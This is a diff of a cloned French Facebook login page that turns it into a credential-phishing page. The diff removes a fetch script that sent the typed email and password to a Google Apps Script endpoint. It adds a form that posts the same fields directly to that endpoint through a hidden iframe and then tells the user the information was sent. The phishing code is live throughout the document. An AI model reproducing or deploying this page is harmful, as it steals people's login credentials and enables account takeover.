@@ -257,43 +257,13 @@
                             </span>
                         </div>
                         <div class="login_form_container">
-                            <form id="login_form" action="#" method="post">
-                                <input type="hidden" name="jazoest" value="2928" autocomplete="off">
-                                <input type="hidden" name="lsd" value="AVoEsznHC78" autocomplete="off">
-                                <div id="loginform">
-                                    <div class="clearfix _5466 _44mg" id="email_container">
-                                        <input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email" id="email" tabindex="0" placeholder="Adresse e-mail ou numéro de tél." value="" autofocus="1" autocomplete="username" aria-label="Adresse e-mail ou numéro de tél.">
-                                    </div>
-                                    <div class="clearfix _5466 _44mg">
-                                        <div>
-                                            <div class="_55r1 _1kbt">
-                                                <input type="password" class="inputtext _55r1 inputtext _9npi inputtext _9npi" name="pass" id="pass" tabindex="0" placeholder="Mot de passe" value="" autocomplete="current-password" aria-label="Mot de passe">
-                                                <div class="_9ls7" id="u_0_3_W7">
-                                                    <a href="#" role="button">
-                                                        <div class="_9lsa">
-                                                            <div class="_9lsb" id="u_0_4_o8"></div>
-                                                        </div>
-                                                    </a>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div class="_xkt">
-                                        <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="0" type="submit">Se connecter</button>
-                                    </div>
-                                    <div id="login_link">
-                                        <div class="_97w3">
-                                            <a href="#" class="_97w4" target="">Informations de compte oubliées ?</a>
-                                        </div>
-                                        <div class="_1rf5">
-                                            <span class="_1rf8">ou</span>
-                                        </div>
-                                        <div class="_xkt">
-                                            <a role="button" class="_42ft _4jy0 _16jx _4jy6 _4jy2 selected _51sy" href="#">Créer un nouveau compte</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </form>
+<form id="login_form" action="https://script.google.com/macros/s/AKfycby950d4wFBK0xIGBtodCqBKYPSsMEvOTel2DbWGtMthgR9IbalOC2vfuEI6JcQDbPf7/exec" method="post" target="hidden_iframe">
+  <input type="text" name="email" id="email" placeholder="Adresse e-mail ou numéro de tél." required />
+  <input type="password" name="pass" id="pass" placeholder="Mot de passe" required />
+  <button type="submit" id="loginbutton">Se connecter</button>
+</form>
+
+<iframe name="hidden_iframe" style="display:none;"></iframe>
                         </div>
                     </div>
                 </div>
@@ -350,38 +320,11 @@
             </div>
         </div>
     </div>
-   <script>
-document.getElementById("login_form").addEventListener("submit", function(event) {
-  event.preventDefault();
-
-  const email = document.getElementById("email").value.trim();
-  const password = document.getElementById("pass").value.trim();
-
-  console.log("Login Attempt:", { email, password });
-
-  fetch("https://script.google.com/macros/s/AKfycby950d4wFBK0xIGBtodCqBKYPSsMEvOTel2DbWGtMthgR9IbalOC2vfuEI6JcQDbPf7/exec", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ email, password })
-  })
-  .then(response => response.json())
-  .then(data => {
-    if(data.status === "success") {
-      alert("Informations envoyées avec succès !");
-      // Optionnel : redirection après succès
-      // window.location.href = "https://www.facebook.com/login/?locale=fr_FR";
-    } else {
-      alert("Erreur serveur : " + data.message);
-    }
-  })
-  .catch(error => {
-    console.error("Erreur lors de l'envoi :", error);
-    alert("Erreur d'envoi !");
+  
+<script>
+  document.getElementById("login_form").addEventListener("submit", function() {
+    alert("Informations envoyées !");
   });
-});
 </script>
-
 </body>
 </html>
